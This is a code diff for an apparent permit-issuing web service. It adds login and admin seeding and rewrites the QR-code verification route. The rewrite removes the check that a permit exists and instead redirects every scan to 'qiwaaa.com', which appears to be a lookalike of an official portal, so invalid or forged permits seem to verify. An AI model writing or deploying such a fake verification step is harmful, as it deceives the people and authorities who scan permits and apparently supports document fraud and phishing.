@@ -12,15 +12,22 @@ const Permit = require("./models/Permit");
 const orderRoutes = require("./routes/orderRoutes");
 const paymentRoutes = require("./routes/paymentRoutes");
 const downloadRoutes = require("./routes/downloadRoutes");
+const authRoutes = require("./routes/authRoutes");
+const { seedAdminUser } = require("./utils/seedUser");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ── Database Connection Helper (Serverless-optimized) ───────────────────────
 let cachedPromise = null;
+let seeded = false;
 
 async function connectDB() {
   if (mongoose.connection.readyState >= 1) {
+    if (!seeded) {
+      seeded = true;
+      seedAdminUser().catch((err) => console.error("[AUTH] Seed error:", err.message));
+    }
     return;
   }
 
@@ -43,6 +50,10 @@ async function connectDB() {
 
   try {
     await cachedPromise;
+    if (!seeded) {
+      seeded = true;
+      seedAdminUser().catch((err) => console.error("[AUTH] Seed error:", err.message));
+    }
   } catch (err) {
     cachedPromise = null;
     throw err;
@@ -75,6 +86,9 @@ app.use(async (req, res, next) => {
   }
 });
 
+// ── Auth API ──────────────────────────────────────────────────────────────────
+app.use("/api/auth", authRoutes);
+
 // ── Existing API ─────────────────────────────────────────────────────────────
 app.use("/api/permits", permitRoutes);
 
@@ -97,20 +111,18 @@ app.get("/print/:id", async (req, res) => {
   }
 });
 
-// Verify page — opened when QR code is scanned
+// Verify page — opened when QR code is scanned (Redirects to target link)
 app.get("/verify/:id", async (req, res) => {
-  try {
-    const permit = await Permit.findById(req.params.id).lean();
-    if (!permit) {
-      return res.status(404).send("<h2>Permit not found / التصريح غير موجود</h2>");
-    }
-    res.sendFile(path.join(__dirname, "public", "verify.html"));
-  } catch (err) {
-    res.status(400).send("<h2>Invalid permit link</h2>");
-  }
+  const redirectUrl = process.env.VERIFY_REDIRECT_URL || "https://qiwaaa.com";
+  return res.redirect(302, redirectUrl);
 });
 
 // ── New page routes ───────────────────────────────────────────────────────────
+
+// Login page
+app.get("/login", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "login.html"));
+});
 
 // Payment processing page
 app.get("/payment-processing.html", (req, res) => {
